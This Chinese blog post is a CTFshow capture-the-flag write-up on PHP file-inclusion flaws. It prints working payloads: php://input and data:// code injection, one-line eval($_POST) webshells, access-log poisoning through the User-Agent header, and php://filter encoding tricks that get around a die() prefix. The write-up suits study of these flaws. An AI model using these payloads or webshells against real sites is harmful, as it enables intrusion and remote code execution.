<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="低头学习  抬头看路" href="https://nnnpc.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="低头学习  抬头看路" href="https://nnnpc.github.io/atom.xml"><link rel="alternate" type="application/json" title="低头学习  抬头看路" href="https://nnnpc.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="WEB"><link rel="canonical" href="https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><title>CTFshow文件包含 - WEB | nnnpc's Blog = 低头学习 抬头看路 = 很多人已经做到了，而他们都曾经和现在的你站在同样的起点上</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CTFshow文件包含</h1><div class="meta"><span class="item" title="创建时间：2024-04-16 13:58:18"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-04-16T13:58:18+08:00">2024-04-16</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">nnnpc's Blog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/WEB/" itemprop="item" rel="index" title="分类于 WEB"><span itemprop="name">WEB</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="nnnpc"><meta itemprop="description" content="很多人已经做到了，而他们都曾经和现在的你站在同样的起点上, 欢迎来交流学习"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="低头学习  抬头看路"></span><div class="body md" itemprop="articleBody"><h1 id="初学文件包含"><a class="anchor" href="#初学文件包含">#</a> 初学文件包含</h1><p>刚开始只懂一些伪协议什么的，对于一个具体的文件包含并不是很了解，先简单记录下原理</p><p>文件包含漏洞：通过 PHP 函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p><p>我的理解就是：由于对包含点没有进行一个很好的过滤，导致能够在包含点做出一些预想之外的操作，从而造成一些危害</p><p>这里引用一下别的师傅对 php://filter 的解析：</p><p><strong>php://filter 可以获取指定文件源码。当它与包含函数结合时，php://filter 流会被当作 php 文件执行。所以我们一般对其进行编码，让其不执行。从而导致<br>任意文件读取。</strong></p><p>简单来说就是 php://filter 与包含函数结合时。该流就会被当作文件执行，而我们对其进行编码之后，它不会执行，导致了任意文件的读取</p><p>记录一下别的师傅博客写的基础姿势：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">php://input可以访问请求的原始数据的只读流。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post设置成文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。遇到file_get_contents()要想到用php://input绕过</span><br><span class="line"></span><br><span class="line">poc1:</span><br><span class="line"></span><br><span class="line">?file=php://input</span><br><span class="line"></span><br><span class="line">[POST DATA] &lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">还可以上传一句话木马 poc2</span><br><span class="line"></span><br><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">php://filter可以获取指定文件源码。php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</span><br><span class="line"></span><br><span class="line">poc1:</span><br><span class="line"></span><br><span class="line">?file=php://filter/resource=xxx.php</span><br><span class="line"></span><br><span class="line">poc2:</span><br><span class="line"></span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class="line"></span><br><span class="line">POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</span><br><span class="line"></span><br><span class="line">zip://可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</span><br><span class="line"></span><br><span class="line">zip://中只能传入绝对路径。</span><br><span class="line"></span><br><span class="line">要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</span><br><span class="line"></span><br><span class="line">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class="line"></span><br><span class="line">相同的类型的还有zlib://和bzip2://</span><br><span class="line"></span><br><span class="line">poc:</span><br><span class="line"></span><br><span class="line">zip://[压缩包绝对路径]#[压缩包内文件]</span><br><span class="line"></span><br><span class="line">?file=zip://D:\zip.jpg%23phpinfo.txt</span><br><span class="line"></span><br><span class="line">data:// 同样类似与php://input，</span><br><span class="line"></span><br><span class="line">phar:// 有点类似zip://</span><br><span class="line"></span><br><span class="line">phar://中相对路径和绝对路径都可以使用</span><br></pre></td></tr></table></figure><p></p><hr><h1 id="web78"><a class="anchor" href="#web78">#</a> WEB78</h1><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F4SzBZJ6OMENnvmp.png!thumbnail" alt=""></p><p>进入环境查看代码</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BMfuSS64eLrfjQiM.png!thumbnail" alt=""></p><p>没有进行任何的过滤</p><p>方法一：</p><p>直接 php://fileter 伪协议读取</p><p>poc：</p><p><strong>?file=php://filter/convert.base64-encode/resource=flag.php</strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6TbW43HalPaNNrWv.png!thumbnail" alt=""></p><p>复制下来 base64 解码得到 flag</p><p>方法二：</p><p>bp 抓包使用？file=php://input 然后接上命令</p><p><strong>语句：</strong></p><p><strong><code>&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</code></strong></p><p>如图所示</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yYRmA1Zn0B2HnGjG.png!thumbnail" alt=""></p><p>获得 flag</p><p><strong>ctfshow{c5e47e9f-a526-4103-8a32-cf582177a187}</strong></p><h1 id="web79"><a class="anchor" href="#web79">#</a> <strong>WEB79</strong></h1><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hvOh32Pct6J2QoYE.png!thumbnail" alt=""></p><p>先开环境看看代码</p><p><span class="exturl" data-url="aHR0cHM6Ly9ubm5wYy0xMzExNDQxMDQwLmNvcy5hcC1zaGFuZ2hhaS5teXFjbG91ZC5jb20vaHZPaDMyUGN0NkoyUW9ZRS5wbmchdGh1bWJuYWls">https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hvOh32Pct6J2QoYE.png!thumbnail</span></p><p>看到它把 php 给过滤了，而 str_replace 区分大小写</p><p>这里涉及到一个知识点：</p><blockquote><p>str_replace 区分大小写，str_ireplace 不区分<br>因为这里是 str_replace，所以是区分大小写的，可以使用大小写变换来进行绕过</p></blockquote><p>配合使用 php://input</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1DBm1Mbj75E4Of7G.png!thumbnail" alt=""></p><p><strong>?file=Php://input</strong></p><p><strong><code>&lt;? php system(&quot;ls&quot;); ?&gt;</code></strong></p><p>先使用命令看看都有什么文件，看到了 flag.php，直接进行读取</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MOuAMGKa6EDqUbAl.png!thumbnail" alt=""></p><p><strong><code>&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</code></strong></p><p>得到 flag</p><p 1654a8fe-95a8-423f-ada7-fc77cf4da835="">ctfshow</p><h1 id="web80"><a class="anchor" href="#web80">#</a> WEB80</h1><p>打开环境，查看代码</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aWljdQvbT4e0Ymd2.png!thumbnail" alt=""></p><p>看到把 php 和 data 都过滤了，因此 php 和 data 的伪协议都使用不了了</p><p>但是依然还是 str_replace，区分大小写，还是可以使用大小写绕过的办法</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/59zcLGHaNtrQ6LxP.png!thumbnail" alt=""></p><p>看到了 fl0g.php，直接 cat 进行读取</p><p><strong><code>&lt;?php system(&quot;cat fl0g.php&quot;); ?&gt;</code></strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Xc1WS1lhZHuFLhJT.png!thumbnail" alt=""></p><p>得到 flag</p><p><strong>ctfshow{0101a529-78eb-4693-b926-cbd85ec90ca7}</strong></p><h1 id="web81"><a class="anchor" href="#web81">#</a> <strong>WEB81</strong></h1><p>打开环境，查看代码</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/sRlISoLFLXWMRxTd.png!thumbnail" alt=""></p><p>在前两道题目的基础上过滤了 &quot;:&quot;，因此伪协议和大小写绕过都行不通了</p><p>可以使用日志文件包含</p><p>首先抓包修改 UA 头传入一句话木马</p><p><strong><code>&lt;?php @eval($_POST['a']);?&gt;</code></strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/U9e6GtCr81gu6uWp.png!thumbnail" alt=""></p><p>再通过 file 访问日志</p><p><strong>?file=/var/log/nginx/access.log</strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vw9begwVyd9D56gy.png!thumbnail" alt=""></p><p>再通过命令执行测试后门</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dMqqphy3FPxutnDq.png!thumbnail" alt=""></p><p>成功，查看文件</p><p><strong>a=system(&quot;ls&quot;);phpinfo();</strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JU1JMEAme2qIvYbg.png!thumbnail" alt=""></p><p>获取 flag</p><p><strong>a=system(&quot;tac fl0g.php&quot;);phpinfo();</strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uxX07sSjpyq0ljTj.png!thumbnail" alt=""></p><p>当使用命令 cat<br>fl0g.php 时，flag 不会被显示在 2 页面上，需要去页面的注释中查看</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bM8Z4ZfgGxCFj84r.png!thumbnail" alt=""></p><p><strong>ctfshow{fa05c0f6-0d77-4782-8eaa-e5bd5285736d}</strong></p><h1 id="web82"><a class="anchor" href="#web82">#</a> <strong>WEB82</strong></h1><h1 id="web83"><a class="anchor" href="#web83">#</a> <strong>WEB83</strong></h1><h1 id="web84"><a class="anchor" href="#web84">#</a> <strong>WEB84</strong></h1><h1 id="web85"><a class="anchor" href="#web85">#</a> <strong>WEB85</strong></h1><h1 id="web86"><a class="anchor" href="#web86">#</a> <strong>WEB86</strong></h1><h1 id="web87"><a class="anchor" href="#web87">#</a> <strong>WEB87</strong></h1><p>打开环境，查看代码</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vk21SAptuNVjoivC.png!thumbnail" alt=""></p><p>发现使用了 die，在开头就写入了 die，会直接导致代码结束执行</p><p>因此需要想办法绕过 die，不然传上去的一句话不会被执行</p><p>首先考虑下怎么样才能绕过 die，能想到的就是编码，而本题也没看到禁用任何的编码，因此直接使用最常规的的 base64，这里引用下<em> Monica</em> 师傅所解释的 base64 绕过方法：</p><blockquote><p>编码时，转换成 Base64 的最小单位就是 3 个字节<br>解码时，4 个字节为一组；PHP 在解码 base64 时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64 的字符选用了 &quot;A-Z、a-z、0-9、+、/&quot;<br>64 个可打印字符）所以，通过 base64 解码过滤之后就只有 phpdie6<br>个字符我们就要添加 2 个字符让 phpdie 和我们增加的两个字符组合起来进行解码。即可抹掉死亡函数。<br>总结起来就是：</p></blockquote><p>对已有的 php 语句，即： <code>&lt;?php die('大佬别秀了');?&gt;</code> ，进行 base64 解码时，其中的可打印字符只有 phpdie 这 6 个字符，我们知道只有 die 被解码了，才能成功绕过，而解码是为 4 个字节为一组，因此我们只要添加两个字符拼接上去，就为八个字符，正好两组，能够被成功解码，从而绕过 die</p><p>而这里将 php 过滤了，因此需要进行 url 编码，并且进行两次 url 编码</p><p>（因为 get 传参的时候会进行一次 urldecode，只进行一次编码的话，同样的一次解码就会使 php 同样被过滤掉）</p><p><strong>?file=php://filter/write=convert.base64-decode/resource=1.php</strong></p><p>进行两次 url 编码后：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure><p></p><p>post 传入一句话：<br><strong><code>&lt;?php eval($_POST[1]);?&gt;</code></strong></p><p>这里需要将该一句话进行 base64 编码并在前面加上两个字符用来解码的时候绕过 die</p><p>PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</p><p>这里涉及到一个知识点，base64 之后末尾为 +，需要将 + 进行 urlencode</p><p>还是引用刚才那个大师傅的解释：</p><blockquote><p>如果直接传入 content，这里的 + 会被当做空格处理，所以在 base64 解码的时候就会忽略空格，自动在后面加上一个 =：即 PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=<br>而加号被当成空格传入被加上 = 进行解码后的结果是：&lt;?php<br>eval($_POST[1]);?</p></blockquote><p>并不是一个完整的一句话了，因此我们想要保留 + 的话就需要对其进行 url 编码</p><p>（同时这里也可以换一个一句话，使其编码之后不带 +）</p><p>最终的一句话：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B</span><br></pre></td></tr></table></figure><p></p><p>传入一句话如图所示</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qOBya9uN89lltL80.png!thumbnail" alt=""></p><p>访问 1.php 然后进行命令执行获取 flag</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UKfoSt3626AP9jKS.png!thumbnail" alt=""></p><p>测试 phpinfo 成功</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4GrysQ0aVr6ajxrz.png!thumbnail" alt=""></p><p><strong>1=system(&quot;ls&quot;);phpinfo();</strong></p><p>找到目录下的文件，tac fl0g.php 获得 flag</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/j4fH5XQL6rzYg2f3.png!thumbnail" alt=""></p><p>得到 flag</p><p><strong>ctfshow{d9f22b7f-b350-4e0e-acf1-18e9e27af3f0}</strong></p><h1 id="web88"><a class="anchor" href="#web88">#</a> WEB88</h1><p>打开环境，查看代码</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lmgVvcyhUZDD9i6Q.png!thumbnail" alt=""></p><p>看到过滤了 php，但是没有过滤 data，因此使用 data 伪协议</p><p>语句：</p><p><strong>?file=data://text/plain;base64, <code>&lt;?php eval($_POST['ttxxxxx']);?&gt;</code> x</strong></p><p>payload：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3R0eHh4eHgnXSk7Pz54</span><br></pre></td></tr></table></figure><p></p><p>后面加一个 x 是为了消除等号，但也可以直接把等号删除<br>但如果出现了 + 号，就需要换个一句话进行 base64encode</p><p>传入 payload</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OvmizlWuUVNnusUe.png!thumbnail" alt=""></p><p>测试 phpinfo 成功</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HLsNSa6EI77kIXQL.png!thumbnail" alt=""></p><p>命令查看目录下文件</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TzlryihFnVCT9TeZ.png!thumbnail" alt=""></p><p>查看 fl0g.php 获得 flag</p><p><strong>ttxxxxx=system(&quot;tac fl0g.php&quot;);phpinfo();</strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2f3jwWipdXoKUKct.png!thumbnail" alt=""></p><p>得到 flag</p><p><strong>ctfshow{8d138758-6761-4e74-a355-d204633d4bfb}</strong></p><h1 id="web116"><a class="anchor" href="#web116">#</a> <strong>WEB116</strong></h1><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HjBEQ5XLcxWcfMJY.png!thumbnail" alt=""></p><p>提示是有 misc 成分在其中</p><p>打开环境发现是一个视频</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iLDrEOAKTQCpi4ak.png!thumbnail" alt=""></p><p>右键保存下来，拖入 winhex 看看</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/418X0kDUvQZS6vsp.png!thumbnail" alt=""></p><p>发现文件尾是以 png 的 16 进制结尾，因此把该 png 分离出来</p><p>kali 中使用 foremost 或 binwalk 分离（也可以直接手动分离）</p><p><strong>foremost 1.mp4</strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/k0A9HquCF4UB0NhF.png!thumbnail" alt=""></p><p>得到一个 output 文件夹</p><p>拿到 png</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YqMCKq3paUDvQP2g.png!thumbnail" alt=""></p><p>查看代码，发现禁用了一些编码和 data，但是没有禁用 php，直接 bp 抓包读取 flag.php</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wGVkrvMJ1wI8fLlb.png!thumbnail" alt=""></p><p>得到 flag，</p><p><strong>ctfshow{81c35502-a3c5-4172-91cc-5640d84ce015}</strong></p><h1 id="web117"><a class="anchor" href="#web117">#</a> WEB117</h1><p>打开环境，查看代码</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n7bf45TrXNy4Go78.png!thumbnail" alt=""></p><p>发现 data 被禁用了，而 php 没有被禁用，但是有 die 函数，所以需要想办法绕过 die 函数</p><p>和 WEB87 很相似，但是这里的 rot13 和 base64 都被禁用了，只能另寻编码使用</p><p>这里就用到了 ucs-2 编码</p><p>usc-2：</p><p>会对目标字符串进行两位一反转</p><p>（因此字符串中的字符数目得是偶数）</p><p>pyload：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=nnnpc.php</span><br></pre></td></tr></table></figure><p></p><p>post 传参：<br><strong>contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</strong></p><blockquote><p>本题原理就是传入先进行两位翻转好的一句话，拼接到死亡函数之后再因为 usc-2 再次进行两位翻转，一句话成功还原，而 die 函数被翻转过滤掉，反转后即：<br>?&lt;hp pid(e;)&gt;? <code>&lt;?php eval($_POST[1]);?&gt;</code></p></blockquote><p>然后访问 nnnpc.php 进行命令执行</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BM13OPRRJ6ji7r71.png!thumbnail" alt=""></p><p>查看 phpinfo 成功，查看目录下的文件</p><p><strong>1=system(&quot;ls&quot;);phpinfo();</strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fmM4wyKHzy4bR2Wn.png!thumbnail" alt=""></p><p>查看 flag.php 获取 flag</p><p><strong>1=system(&quot;tac flag.php&quot;);phpinfo();</strong></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XhG2Ag0HC1VwZwyB.png!thumbnail" alt=""></p><p>得到 flag</p><p><strong>ctfshow{f57f34ae-acb2-48db-9e4f-71b53a8be8e2}</strong></p><div class="tags"><a href="/tags/WEB/" rel="tag"><i class="ic i-tag"></i> WEB</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2024-04-16 17:03:36" itemprop="dateModified" datetime="2024-04-16T17:03:36+08:00">2024-04-16</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>nnnpc <i class="ic i-at"><em>@</em></i>低头学习 抬头看路</li><li class="link"><strong>本文链接：</strong> <a href="https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTFshow文件包含">https://nnnpc.github.io/2024/04/16/CTFshow文件包含/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;nnnpc-1311441040.cos.ap-shanghai.myqcloud.com&#x2F;1.jpg" title="CTFshow命令执行"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> WEB</span><h3>CTFshow命令执行</h3></a></div><div class="item right"><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;nnnpc-1311441040.cos.ap-shanghai.myqcloud.com&#x2F;1.jpg" title="CTFshow文件上传151-170"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> WEB</span><h3>CTFshow文件上传151-170</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E5%AD%A6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.</span> <span class="toc-text">初学文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web78"><span class="toc-number">2.</span> <span class="toc-text">WEB78</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web79"><span class="toc-number">3.</span> <span class="toc-text">WEB79</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web80"><span class="toc-number">4.</span> <span class="toc-text">WEB80</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web81"><span class="toc-number">5.</span> <span class="toc-text">WEB81</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web82"><span class="toc-number">6.</span> <span class="toc-text">WEB82</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web83"><span class="toc-number">7.</span> <span class="toc-text">WEB83</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web84"><span class="toc-number">8.</span> <span class="toc-text">WEB84</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web85"><span class="toc-number">9.</span> <span class="toc-text">WEB85</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web86"><span class="toc-number">10.</span> <span class="toc-text">WEB86</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web87"><span class="toc-number">11.</span> <span class="toc-text">WEB87</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web88"><span class="toc-number">12.</span> <span class="toc-text">WEB88</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web116"><span class="toc-number">13.</span> <span class="toc-text">WEB116</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web117"><span class="toc-number">14.</span> <span class="toc-text">WEB117</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2024/04/16/bugku%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1-2/" rel="bookmark" title="bugku文件包含1-2">bugku文件包含1-2</a></li><li><a href="/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="CTFshow命令执行">CTFshow命令执行</a></li><li class="active"><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="CTFshow文件包含">CTFshow文件包含</a></li><li><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/" rel="bookmark" title="CTFshow文件上传151-170">CTFshow文件上传151-170</a></li><li><a href="/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/" rel="bookmark" title="CTFshow信息收集1-20">CTFshow信息收集1-20</a></li><li><a href="/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/" rel="bookmark" title="SSTI学习">SSTI学习</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="nnnpc" data-src="/images/avatar.jpg"><p class="name" itemprop="name">nnnpc</p><div class="description" itemprop="description">欢迎来交流学习</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">62</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">13</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span> <span class="name">标签</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" 